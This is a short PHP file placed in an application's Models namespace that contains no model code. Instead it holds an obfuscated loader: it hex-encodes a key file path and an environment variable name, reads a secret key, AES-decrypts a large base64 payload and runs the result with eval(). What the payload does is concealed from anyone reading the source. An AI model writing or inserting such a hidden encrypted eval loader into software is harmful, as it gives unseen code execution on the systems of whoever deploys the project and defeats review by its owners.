<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('s5qshQN4zQx8N6EexIrJeg==');

$c=base64_decode(

'Rde7PpR9Bj0NBmo2jghb/jAZy6NiK7OJK7MLehSubzQXMA3R+zf3SNeOXjGy54WKt7cPLaHmY0Av' .
'O91CKmhlMqW25CzUjmbW9ZhH46Af7rgbLpLn4ntIaLKIC0qWuwdafwGBZS+bc6HD0fUMM1j7sHaK' .
'JFFtbb0qzhNsehXMNvAQu4iGpTBdVQNbOx2D1m1LbGBwqP8Nj9GfbccdVlJ5GKG0PHqH/8LIk/QJ' .
'AVsRSAAmI2V8B/NPeTpYXMzNEev99i+X4/G0kraKwCv8J50vGeBOpu/bbcNlg9HkuirGPe8U43qu' .
'2PioNMubBTWNOHZRHaO+m7ejisENJU4UUDCH9ZxdUiEoGTxqO25cWD+lTzT8/9am9Gj7rnBAqDgm' .
'BFmh+hOuEyXW9btddvvv7LOEGBNjom5l139hXxY6rgQN+4osrYFTGqIKqlGe73rjkHZrhrIyTAwR' .
'ydaMYh+IeFNFw/Anv0i0b6RyjpiU8Mqe2tlSwJiTp4q0r4e0VwfBC/4vXU1y8PbUILBnMA865VjT' .
'sfL4EZKDQJ+E3czyEha9AZ5rH5kfshqzq1EhKjS0nm0YsWP32tf2zaM3P7q6Wb/FDfZAOmx+3eD3' .
'vC/WM4aUfqNou102HcnkIsnWL+y0vSOrpVQexqsULSVwzx8XbvYERoXe0e57qeUyf5LgsZCPgbXX' .
'dKsrchFJUkDbQOjMVtkKBI+E965gP2LJVeKaDyzYy9s71y4DYUnv72xKXw8HXGkoYcs9/m8dKySR' .
'zjhAxJLupLYFOLUeZRIGwbLJi50DZGLWNUBLQ4TiZ2LOINznbrBs/urnOz23NSMBGEHMD1tL3hn9' .
'T3HpPDDh2uxaoCHF6Y7JXR/sXKwGQlF8DRpSUQVSg+OOv+Zj61YWrY9sjhqx2e2EMuqf4GggXEcn' .
'pEuSri1sN9NH5rIEfMtM7lQ5iODv1irQYy5d/bQ71vcEzu+8INxubnvcFgWGaJ4hqFyicA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

